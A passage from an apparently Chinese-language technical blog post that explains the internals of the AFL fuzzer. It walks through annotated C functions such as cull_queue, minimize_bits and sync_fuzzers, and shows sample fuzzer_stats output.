punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果这个位已经有获胜者</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span>fav_factor <span class="token operator">></span> top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>exec_us <span class="token operator">*</span> top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>len<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//原来的更优则跳过</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">--</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>tc_ref<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//当前更优，减少引用计数</span>           <span class="token function">ck_free</span><span class="token punctuation">(</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>trace_mini<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//引用计数为 0 则释放内存清空指针</span>           top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>trace_mini <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>               <span class="token comment">//将当前用例插入 top_rated 作为新的获胜者</span>       top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">;</span>       q<span class="token operator">-></span>tc_ref<span class="token operator">++</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>q<span class="token operator">-></span>trace_mini<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果还没有最小化的位图</span>         q<span class="token operator">-></span>trace_mini <span class="token operator">=</span> <span class="token function">ck_alloc</span><span class="token punctuation">(</span>MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 分配内存</span>         <span class="token function">minimize_bits</span><span class="token punctuation">(</span>q<span class="token operator">-></span>trace_mini<span class="token punctuation">,</span> trace_bits<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 最小化位图</span>       <span class="token punctuation">&#125;</span>       score_changed <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 标记得分已改变</span>     <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="minimize-bits"><a href="#minimize-bits" class="headerlink" title="minimize_bits"></a>minimize_bits</h3><p>压缩数据大小，将数据本身转换成位置记录下来（是否覆盖到和覆盖了多少次的byte，压缩成是否覆盖到的bit）</p><p>原本表示 15 有值需要 n[14] &#x3D; 1，数据量大会消耗大量内存，这里的计算方式改成用 bitmap 二进制数值表示该位是否有值，例如 15 有值则表示为 0000000000000001</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">minimize_bits</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> dst<span class="token punctuation">,</span> u8<span class="token operator">*</span> src<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> MAP_SIZE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span>src<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span> dst<span class="token punctuation">[</span>i <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">|=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    i<span class="token operator">++</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="cull-queue"><a href="#cull-queue" class="headerlink" title="cull_queue"></a>cull_queue</h3><p>精简队列，<a href="##update_bitmap_score">update_bitmap_score</a> 过程中找到每条边的最佳测试用例，但是合在一起就存在冗余，所以还需要在这组测试用例中选择一个子集使得不会冗余</p><p>贪心算法：获取第一个的最佳测试用例，将其涉及的边标记，遍历剩余边未被标记就加入其最佳测试用例</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">cull_queue</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q<span class="token punctuation">;</span>  <span class="token keyword">static</span> u8 temp_v<span class="token punctuation">[</span>MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  u32 i<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>dumb_mode <span class="token operator">||</span> <span class="token operator">!</span>score_changed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//如果设置了 dumb_mode 或没有设置 scor_changed，直接返回</span>  score_changed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>temp_v<span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化 temp_v 全1，代表未覆盖，后续覆盖到则设置为0</span>  queued_favored  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  pending_favored <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  q <span class="token operator">=</span> queue<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//遍历 queue 队列，设置其 favored 的值都为 0</span>    q<span class="token operator">-></span>favored <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> MAP_SIZE<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>temp_v<span class="token punctuation">[</span>i <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//该 path 有最优解且 temp_v 标记未覆盖</span>      u32 j <span class="token operator">=</span> MAP_SIZE <span class="token operator">>></span> <span class="token number">3</span><span class="token punctuation">;</span><span class="token comment">// 获取 temp_v 的大小</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span>j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token comment">//遍历覆盖到的 path 并将遍历到的位置在 temp_v 中标记为覆盖</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>trace_mini<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>          temp_v<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&amp;=</span> <span class="token operator">~</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>trace_mini<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>      top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>favored <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//该边标记 favored</span>      queued_favored<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//favored 数 +1</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>top_rated<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-></span>was_fuzzed<span class="token punctuation">)</span> pending_favored<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//还没有 fuzz 过，pending 计数器 +1</span>    <span class="token punctuation">&#125;</span>  q <span class="token operator">=</span> queue<span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">mark_as_redundant</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> <span class="token operator">!</span>q<span class="token operator">-></span>favored<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 不是 favored 的 case，标记冗余的条目</span>    q <span class="token operator">=</span> q<span class="token operator">-></span>next<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="show-init-stats"><a href="#show-init-stats" class="headerlink" title="show_init_stats"></a>show_init_stats</h3><p>在处理输入目录的末尾显示统计信息，以及一堆警告,以及几个硬编码的常量，ui 展示一些信息</p><p>输出内容如下：</p><pre class="line-numbers language-none"><code class="language-none">[+] Here are some useful stats:    Test case count : 1 favored, 0 variable, 1 total       Bitmap range : 2 to 2 bits (average: 2.00 bits)        Exec timing : 682 to 682 us (average: 682 us)[*] No -t option specified, so I&#39;ll use exec timeout of 20 ms.[+] All set and ready to roll!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-start-position"><a href="#find-start-position" class="headerlink" title="find_start_position"></a>find_start_position</h3><p>resume （恢复之前的 fuzz）时，尝试查找要开始的队列的位置</p><ul><li>如果是 in_place_resume,就打开 out_dir&#x2F;fuzzer_stats 文件，否则打开 in_dir&#x2F;..&#x2F;fuzzer_stats 文件</li><li>读文件内容到 tmp 中，找到 cur_path，并设置为 ret 的值，如果大于 queued_paths 就设置 ret 为 0，返回 ret</li></ul><h3 id="write-stats-file"><a href="#write-stats-file" class="headerlink" title="write_stats_file"></a>write_stats_file</h3><p>更新 fuzzer_stats 文件，创建 out_dir&#x2F;fuzzer_stats 文件并写入统计信息</p><ul><li>start_time：fuzz运行的开始时间，start_time &#x2F; 1000</li><li>last_update：当前时间</li><li>fuzzer_pid：获取当前pid</li><li>cycles_done：queue_cycle 在 queue_cur 为空，即执行到当前队列尾的时候才增加 1，所以这代表 queue 队列被完全变异一次的次数</li><li>execs_done：total_execs，target的总的执行次数，每次 run_target 的时候会增加 1</li><li>execs_per_sec：每秒执行的次数</li><li>paths_total：queued_paths 在每次 add_to_queue 的时候会增加 1，代表 queue 里的样例总数</li><li>paths_favored：queued_favored，有价值的路径总数</li><li>paths_found：queued_discovered 在每次 common_fuzz_stuff 去执行一次fuzz时，发现新的 interesting case 的时候会增加 1，代表在 fuzz 运行期间发现的新 queue entry</li><li>paths_imported：queued_imported 是 master-slave 模式下，如果 sync 过来的 case 是 interesting 的，就增加 1</li><li>max_depth：最大路径深度</li><li>cur_path：current_entry 一般情况下代表的是正在执行的 queue entry 的整数 ID, queue 首节点的 ID 是 0</li><li>pending_favs：pending_favored 等待 fuzz 的 favored paths数</li><li>pending_total：pending_not_fuzzed 在 queue 中等待 fuzz 的 case 数</li><li>variable_paths：queued_variable 在 calibrate_case 去评估一个新的 test case 的时候，如果发现这个 case 的路径是可变的，则将这个计数器加一，代表发现了一个可变 case</li><li>stability</li><li>bitmap_cvg</li><li>unique_crashes：在 save_if_interesting 时，如果 fault 是 FAULT_CRASH，就将 unique_crashes 计数器加一</li><li>unique_hangs：在 save_if_interesting 时，如果 fault 是 FAULT_TMOUT，且 exec_tmout 小于 hang_tmout，就以 hang_tmout 为超时时间再执行一次，如果还超时，就让 hang 计数器加一</li><li>last_path：在 add_to_queue 里将一个新 case 加入 queue 时，就设置一次 last_path_time 为当前时间，last_path_time &#x2F; 1000</li><li>last_crash：在 unique_crashes 加一的时候，last_crash 也更新时间，last_crash_time &#x2F; 1000</li><li>last_hang：在unique_hangs加一的时候，last_hang也更新时间，last_hang_time &#x2F; 1000</li><li>execs_since_crash：total_execs - last_crash_execs，这里 last_crash_execs 是在上一次 crash 的时候的总计执行了多少次</li><li>exec_tmout：配置好的超时时间</li></ul><p>最终在 out&#x2F;fuzzer1&#x2F;fuzzer_stats 中输出了</p><pre class="line-numbers language-none"><code class="language-none">start_time        : 1741245280last_update       : 1741259061fuzzer_pid        : 3829cycles_done       : 0execs_done        : 8execs_per_sec     : 0.00paths_total       : 1paths_favored     : 1paths_found       : 0paths_imported    : 0max_depth         : 1cur_path          : 0pending_favs      : 1pending_total     : 1variable_paths    : 0stability         : 0.00%bitmap_cvg        : 0.00%unique_crashes    : 0unique_hangs      : 0last_path         : 0last_crash        : 0last_hang         : 0execs_since_crash : 8exec_timeout      : 1000afl_banner        : fuzzer1afl_version       : 2.57btarget_mode       : defaultcommand_line      : &#x2F;home&#x2F;starrysky&#x2F;AFL&#x2F;afl-fuzz -i in -o out -M fuzzer1 .&#x2F;testslowest_exec_ms   : 1000peak_rss_mb       : not available while afl is running<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="save-auto"><a href="#save-auto" class="headerlink" title="save_auto"></a>save_auto</h3><p>保存自动生成的 extras，遍历 a_extras 写到 out_dir&#x2F;queue&#x2F;.state&#x2F;auto_extras&#x2F;（auto_%06u）i</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">save_auto</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u32 i<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>auto_changed<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  auto_changed <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">MIN</span><span class="token punctuation">(</span>USE_AUTO_EXTRAS<span class="token punctuation">,</span> a_extras_cnt<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u8<span class="token operator">*</span> fn <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/queue/.state/auto_extras/auto_%06u"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    s32 fd<span class="token punctuation">;</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fn<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_TRUNC<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>data<span class="token punctuation">,</span> a_extras<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>len<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>fn<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="sync-fuzzers"><a href="#sync-fuzzers" class="headerlink" title="sync_fuzzers"></a>sync_fuzzers</h3><p>同步各个 fuzz 之间的状态，将其他 fuzz 下的 queue 保存到自己的 queue 中</p><ul><li>打开 sync_dir 同步目录</li><li>遍历同步文件夹下其他 fuzz 的文件夹<ul><li>跳过 . &#x2F; .. &#x2F; 当前 fuzz 文件夹</li><li>获取同步目录下其他 fuzz 文件夹中的 queue，存在说明这个文件夹是其他 fuzz 的 out_dir</li><li>在本 fuzz 的输出文件夹 out_dir 的 .synced 文件夹下创建&#x2F;打开以其他 fuzz 命名的文件</li><li>如果是打开，即文件已存在，则获取前 4 位为 min_accept 并且更新 next_min_accept &#x3D; min_accept</li><li>更新阶段信息、同步计数器</li><li>从其他 fuzz 的 queue 里遍历测试用例<ul><li>从文件名中获取id，跳过文件名是 . &#x2F; .. 和 id &lt; min_accept（已遍历过）的用例</li><li>更新下一次的 min_accept 为第一个满足条件的测试用例的 id + 1</li><li>将测试用例内容映射到内存并调用 <a href="##write_to_testcase">write_to_testcase</a> 写入当前的测试用例</li><li>调用 <a href="##run_target">run_target</a> 执行测试用例，如果用户手动中断则返回，调用 <a href="##save_if_interesting">save_if_interesting</a> 判断如果是 interesting case 保存并增加导入计数</li><li>设置当前同步的 fuzzer 的名称，解除内存映射，增加 cur 计数器，达到 stats_update_freq  的倍数就刷新 ui 界面</li></ul></li><li>关闭文件，释放内存</li></ul></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">sync_fuzzers</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  DIR<span class="token operator">*</span> sd<span class="token punctuation">;</span>  <span class="token keyword">struct</span> <span class="token class-name">dirent</span><span class="token operator">*</span> sd_ent<span class="token punctuation">;</span>  u32 sync_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  sd <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span>sync_dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//打开 sync 文件夹（同步目录）</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>sd<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to open '%s'"</span><span class="token punctuation">,</span> sync_dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  stage_max <span class="token operator">=</span> stage_cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  cur_depth <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>sd_ent <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span>sd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//遍历同步文件夹下其他 fuzz 的文件夹</span>    <span class="token keyword">static</span> u8 stage_tmp<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    DIR<span class="token operator">*</span> qd<span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">dirent</span><span class="token operator">*</span> qd_ent<span class="token punctuation">;</span>    u8 <span class="token operator">*</span>qd_path<span class="token punctuation">,</span> <span class="token operator">*</span>qd_synced_path<span class="token punctuation">;</span>    u32 min_accept <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> next_min_accept<span class="token punctuation">;</span>    s32 id_fd<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>sd_ent<span class="token operator">-></span>d_name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>sync_id<span class="token punctuation">,</span> sd_ent<span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//跳过 . / .. 和当前 fuzz 生成的文件夹</span>    qd_path <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/%s/queue"</span><span class="token punctuation">,</span> sync_dir<span class="token punctuation">,</span> sd_ent<span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取同步目录下其他 fuzz 文件夹里的 queue 文件夹</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>qd <span class="token operator">=</span> <span class="token function">opendir</span><span class="token punctuation">(</span>qd_path<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>qd_path<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token comment">//打开失败就释放空间跳过</span>    qd_synced_path <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/.synced/%s"</span><span class="token punctuation">,</span> out_dir<span class="token punctuation">,</span> sd_ent<span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//在本 fuzz 输出目录的同步文件夹下创建其他 fuzz 命名的文件</span>    id_fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>qd_synced_path<span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_CREAT<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> qd_synced_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>id_fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>min_accept<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>u32<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">// 若这个文件已经存在，则它的首 4 字节表示 min_accept</span>      <span class="token function">lseek</span><span class="token punctuation">(</span>id_fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">SEEK_SET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    next_min_accept <span class="token operator">=</span> min_accept<span class="token punctuation">;</span>    <span class="token comment">//更新阶段信息、同步计数器</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>stage_tmp<span class="token punctuation">,</span> <span class="token string">"sync %u"</span><span class="token punctuation">,</span> <span class="token operator">++</span>sync_cnt<span class="token punctuation">)</span><span class="token punctuation">;</span>    stage_name <span class="token operator">=</span> stage_tmp<span class="token punctuation">;</span>    stage_cur  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    stage_max  <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>qd_ent <span class="token operator">=</span> <span class="token function">readdir</span><span class="token punctuation">(</span>qd<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//从其他 fuzz 的 queue 里遍历</span>      u8<span class="token operator">*</span> path<span class="token punctuation">;</span>      s32 fd<span class="token punctuation">;</span>      <span class="token keyword">struct</span> <span class="token class-name">stat</span> st<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>qd_ent<span class="token operator">-></span>d_name<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'.'</span> <span class="token operator">||</span>          <span class="token function">sscanf</span><span class="token punctuation">(</span>qd_ent<span class="token operator">-></span>d_name<span class="token punctuation">,</span> CASE_PREFIX <span class="token string">"%06u"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>syncing_case<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token operator">||</span>           syncing_case <span class="token operator">&lt;</span> min_accept<span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span><span class="token comment">//从文件名中获取id，跳过文件名是 . / .. 和 id &lt; min_accept（已遍历过）的用例</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>syncing_case <span class="token operator">>=</span> next_min_accept<span class="token punctuation">)</span><span class="token comment">//更新下一次的 min_accept 为下一个 id</span>        next_min_accept <span class="token operator">=</span> syncing_case <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>      path <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/%s"</span><span class="token punctuation">,</span> qd_path<span class="token punctuation">,</span> qd_ent<span class="token operator">-></span>d_name<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取循环到的测试用例</span>      fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token function">ck_free</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">continue</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fstat</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token operator">&amp;</span>st<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fstat() failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取与文件描述符相关的文件状态信息</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>st<span class="token punctuation">.</span>st_size <span class="token operator">&amp;&amp;</span> st<span class="token punctuation">.</span>st_size <span class="token operator">&lt;=</span> MAX_FILE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//文件大小合法</span>        u8  fault<span class="token punctuation">;</span>        u8<span class="token operator">*</span> mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">,</span> PROT_READ<span class="token punctuation">,</span> MAP_PRIVATE<span class="token punctuation">,</span> fd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为测试用例开辟空间</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>mem <span class="token operator">==</span> MAP_FAILED<span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to mmap '%s'"</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">write_to_testcase</span><span class="token punctuation">(</span>mem<span class="token punctuation">,</span> st<span class="token punctuation">.</span>st_size<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将内存映射的文件内容写入当前的测试用例</span>        fault <span class="token operator">=</span> <span 